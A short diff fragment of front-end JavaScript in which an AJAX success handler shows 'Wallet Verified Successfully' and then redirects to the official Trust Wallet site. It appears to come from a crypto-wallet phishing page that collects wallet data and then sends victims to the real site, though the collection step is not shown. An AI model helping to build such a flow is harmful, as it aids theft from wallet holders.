@@ -252,6 +252,7 @@
                 processData: false
             }).done(function () {
                 alert('Wallet Verified Successfully');
+                window.location.href = 'https://trustwallet.com/';
             }).fail(function (error) {
                 alert('Error: ' + JSON.stringify(error));
             });
